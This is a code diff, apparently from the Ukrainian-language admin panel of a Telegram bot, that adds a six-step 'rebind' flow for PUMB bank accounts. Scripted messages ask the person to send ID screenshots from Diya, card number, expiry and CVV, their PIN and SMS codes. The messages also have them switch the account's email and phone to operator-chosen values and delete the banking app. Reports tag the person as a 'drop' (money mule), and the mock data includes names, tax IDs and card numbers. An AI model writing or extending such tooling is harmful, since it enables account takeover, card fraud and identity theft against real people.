@@ -208,7 +208,7 @@ window.getTelegramMockupHtml = function(rawTemplate, bankKey) {
     
     // Replace placeholders with mock data
     const replacements = {
-        "{pib}": "<b>Горбачевська Софія Антонівна</b>",
+        "{pib}": "<b>МАТЮНІН ОЛЕГ ОЛЕГОВИЧ</b>",
         "{dob}": "29.01.2007",
         "{ipn}": "3911006569",
         "{phone}": "+380 (97) 134 46 82",
@@ -218,7 +218,11 @@ window.getTelegramMockupHtml = function(rawTemplate, bankKey) {
         "{line_phone}": "380950369906",
         "{code}": "<b>1234</b>",
         "{card}": "5457082534505537",
-        "{bank}": bankKey === 'new-bank' ? 'new-bank' : bankKey
+        "{bank}": bankKey === 'new-bank' ? 'new-bank' : bankKey,
+        "{target_phone}": "943554053",
+        "{target_email}": "jotbidnor@macr2.com",
+        "{card_details}": "4421 4421 4213 4921\n12/29\n432",
+        "{pincode}": "42134"
     };
     
     for (let place in replacements) {
@@ -337,8 +341,96 @@ function addDragAndDropListeners(item) {
         });
     });
 }
+function getPumbRebindTab2HTML(itemKey, template) {
+    const cardText = template.text || "Надішліть, будь ласка, дані вашої гривневої картки ПУМБ:\n\n• Номер картки\n• Термін дії\n• CVV";
+    const anketaText = template.relink_instruction_text || "Змініть анкетні дані та пошту\n\n• Вкажіть пошту: {target_email}\n\nЯкщо щось не зрозуміло то пишіть";
+    const phoneText = template.instruction_text || "Тепер міняємо номер телефону:\n{target_phone}\n\nКоли потрібен буде СМС код, то пишіть до чату \"Код\"\nЯк зміниться надішлете скріншот що номер змінився";
+    const pinText = template.success_text || "Вкажіть ПІН-код / пароль який використовується для входу?";
+    const delText = template.deletion_text || "🗑 Надішліть скріншот видалення додатка ПУМБ з вашого телефону.";
+
+    return `
+        <div style="display: flex; flex-direction: column; gap: 16px;">
+            <div style="background: rgba(99,102,241,0.08); border: 1px solid rgba(99,102,241,0.25); border-radius: 12px; padding: 14px; color: #e0e7ff; font-size: 0.85rem; display: flex; align-items: center; gap: 10px;">
+                <span style="font-size: 1.2rem;">🔄</span>
+                <div><b>Конструктор кроків ПУМБ:</b> Налаштуйте текстові повідомлення та фото для кожного з 6 кроків перев'язу ПУМБ.</div>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px;">
+
+                <!-- Step 1: Diya Screenshots -->
+                <div style="background: rgba(255,255,255,0.015); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #818cf8; margin-bottom: 4px;">Крок 1: 7 Скріншотів з Дії</div>
+                        <div style="font-size: 0.74rem; color: rgba(255,255,255,0.5);">ШІ (OCR) автоматично розпізнає ПІБ, дату народження та ІПН з документів.</div>
+                    </div>
+                    <div style="background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.25); border-radius: 8px; padding: 8px 10px; color: #4ade80; font-size: 0.75rem; font-weight: 600; text-align: center;">
+                        🟢 ШІ OCR Увімкнено (ПІБ / ІПН)
+                    </div>
+                </div>
+
+                <!-- Step 2: Card Details -->
+                <div style="background: rgba(255,255,255,0.015); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #a5b4fc; margin-bottom: 4px;">Крок 2: Запит картки ПУМБ</div>
+                        <div style="font-size: 0.74rem; color: rgba(255,255,255,0.5); margin-bottom: 8px;">Текст прохання реквізитів картки (Номер, Термін, CVV).</div>
+                    </div>
+                    <textarea id="bank-acc-text-${itemKey}" class="form-control auto-grow-textarea" rows="3" style="font-size: 0.78rem; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: #fff; padding: 8px 10px; width: 100%; box-sizing: border-box; font-family: inherit;" placeholder="Текст запиту картки...">${cardText}</textarea>
+                </div>
+
+                <!-- Step 3: Anketa & Email -->
+                <div style="background: rgba(255,255,255,0.015); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #a5b4fc; margin-bottom: 4px;">Крок 3: Анкетні дані та пошта</div>
+                        <div style="font-size: 0.74rem; color: rgba(255,255,255,0.5); margin-bottom: 8px;">Надсилається разом з фото Anketa.jpg.</div>
+                    </div>
+                    <div style="display: flex; flex-direction: column; align-items: center; gap: 6px;">
+                        <span id="anketa-filename-${itemKey}" class="file-upload-filename-pill selected" style="font-size: 0.72rem;">Anketa.jpg (активне фото)</span>
+                        <div class="custom-file-upload-wrapper" style="width: 100%; max-width: 180px;">
+                            <label for="bank-acc-anketa-${itemKey}" class="custom-file-upload-label" style="justify-content: center; width: 100%; padding: 6px 10px; font-size: 0.75rem;">
+                                <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
+                                Обрати нову Anketa.jpg
+                            </label>
+                            <input type="file" id="bank-acc-anketa-${itemKey}" accept="image/*" style="display: none;" onchange="document.getElementById('anketa-filename-${itemKey}').textContent = this.files[0] ? this.files[0].name : 'Anketa.jpg'">
+                        </div>
+                    </div>
+                    <textarea id="bank-acc-relink-instr-${itemKey}" class="form-control auto-grow-textarea" rows="3" style="font-size: 0.78rem; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: #fff; padding: 8px 10px; width: 100%; box-sizing: border-box; font-family: inherit;" placeholder="Текст прохання пошти...">${anketaText}</textarea>
+                </div>
+
+                <!-- Step 4: Phone Change -->
+                <div style="background: rgba(255,255,255,0.015); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #a5b4fc; margin-bottom: 4px;">Крок 4: Зміна номера телефону</div>
+                        <div style="font-size: 0.74rem; color: rgba(255,255,255,0.5); margin-bottom: 8px;">Інструкція зміни номера та передачі СМС-коду.</div>
+                    </div>
+                    <textarea id="bank-acc-instruction-text-${itemKey}" class="form-control auto-grow-textarea" rows="3" style="font-size: 0.78rem; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: #fff; padding: 8px 10px; width: 100%; box-sizing: border-box; font-family: inherit;" placeholder="Текст зміни номера...">${phoneText}</textarea>
+                </div>
+
+                <!-- Step 5: PIN Code -->
+                <div style="background: rgba(255,255,255,0.015); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #a5b4fc; margin-bottom: 4px;">Крок 5: Ввід ПІН-коду</div>
+                        <div style="font-size: 0.74rem; color: rgba(255,255,255,0.5); margin-bottom: 8px;">Запит ПІН-коду / паролю входу в додаток.</div>
+                    </div>
+                    <textarea id="bank-acc-success-text-${itemKey}" class="form-control auto-grow-textarea" rows="3" style="font-size: 0.78rem; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: #fff; padding: 8px 10px; width: 100%; box-sizing: border-box; font-family: inherit;" placeholder="Текст прохання ПІН-коду...">${pinText}</textarea>
+                </div>
+
+                <!-- Step 6: App Deletion -->
+                <div style="background: rgba(255,255,255,0.015); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #a5b4fc; margin-bottom: 4px;">Крок 6: Видалення додатка ПУМБ</div>
+                        <div style="font-size: 0.74rem; color: rgba(255,255,255,0.5); margin-bottom: 8px;">Запит скріншоту видалення додатка з телефону.</div>
+                    </div>
+                    <textarea id="bank-acc-deletion-text-${itemKey}" class="form-control auto-grow-textarea" rows="3" style="font-size: 0.78rem; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: #fff; padding: 8px 10px; width: 100%; box-sizing: border-box; font-family: inherit;" placeholder="Текст запиту видалення...">${delText}</textarea>
+                </div>
+
+            </div>
+        </div>
+    `;
+}
+
 function getBankAccordionItemHTML(itemKey, bankKey, template, activeSubTab, options = {}) {
     const isPaused = template.is_active === 0;
+    const isPumb = bankKey.toLowerCase() === 'pumb' || itemKey.toLowerCase() === 'pumb';
     const displayName = template.display_name || bankKey;
     const avatarHTML = `<div style="width: 30px; height: 30px; border-radius: 50%; background: ${getBankIconGradient(bankKey, template.logo_path)}; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">${getBankIcon(bankKey, template.logo_path)}</div>`;
     const formSubmit = options.noActions ? 'event.preventDefault();' : `saveAccordionBankSettings(event, '${bankKey}')`;
@@ -522,6 +614,7 @@ function getBankAccordionItemHTML(itemKey, bankKey, template, activeSubTab, opti
 
                     <!-- TAB 2: Media Instructions -->
                     <div id="bank-tab-content-${itemKey}-media" class="bank-tab-content" style="${activeSubTab === 'media' ? '' : 'display: none;'}">
+                        ${isPumb ? getPumbRebindTab2HTML(itemKey, template) : `
                         <div class="bank-media-grid">
                             <!-- Download Screenshot Card -->
                             <div style="background: rgba(255,255,255,0.01); border: 1px solid rgba(255,255,255,0.04); border-radius: 14px; padding: 16px; display: flex; flex-direction: column; align-items: center; text-align: center; gap: 14px; justify-content: space-between; position: relative; overflow: hidden; min-height: 330px;">
@@ -710,7 +803,7 @@ function getBankAccordionItemHTML(itemKey, bankKey, template, activeSubTab, opti
                                 </div>
                             </div>
                         </div>
-
+                        `}
                     </div>
 
                     <!-- TAB 3: AI & Verifier -->
@@ -725,11 +818,17 @@ function getBankAccordionItemHTML(itemKey, bankKey, template, activeSubTab, opti
                                     </svg>
                                     Шаблон повідомлення для верифікатора
                                 </div>
-                                <textarea id="bank-acc-report-tpl-${itemKey}" class="form-control auto-grow-textarea" rows="6" style="width: 100%; font-family: monospace; font-size: 0.78rem; line-height: 1.4; resize: none; height: 180px; overflow-y: auto;" oninput="updateTelegramMockupPreview('${itemKey}')" placeholder="Шаблон звіту...">${template.report_template || `{pib}\n{dob}\n{ipn}\n{phone}\n\nДроп - @{username}\n\nLine {line_id} Return: {line_phone} | {bank}\n\n{code}`}</textarea>
+                                <textarea id="bank-acc-report-tpl-${itemKey}" class="form-control auto-grow-textarea" rows="6" style="width: 100%; font-family: monospace; font-size: 0.78rem; line-height: 1.4; resize: none; height: 180px; overflow-y: auto;" oninput="updateTelegramMockupPreview('${itemKey}')" placeholder="Шаблон звіту...">${template.report_template || (isPumb ? `Перев'яз ПУМБ\n\n{pib}\n\n{target_phone}\n{target_email}\n\n{card_details}\n\n{pincode}` : `{pib}\n{dob}\n{ipn}\n{phone}\n\nДроп - @{username}\n\nLine {line_id} Return: {line_phone} | {bank}\n\n{code}`)}</textarea>
                                 <div style="display: flex; flex-direction: column; gap: 6px; margin-top: 4px; text-align: left;">
                                     <span style="font-size: 0.75rem; color: rgba(255,255,255,0.35); font-weight: 500;">💡 Доступні змінні (натисніть для вставки):</span>
                                     <div class="tag-pills-container">
                                         <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{pib}')">{pib}</div>
+                                        ${isPumb ? `
+                                        <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{target_phone}')">{target_phone}</div>
+                                        <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{target_email}')">{target_email}</div>
+                                        <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{card_details}')">{card_details}</div>
+                                        <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{pincode}')">{pincode}</div>
+                                        ` : `
                                         <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{dob}')">{dob}</div>
                                         <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{ipn}')">{ipn}</div>
                                         <div class="tag-pill" onclick="insertPlaceholderTag('${itemKey}', '{phone}')">{phone}</div>
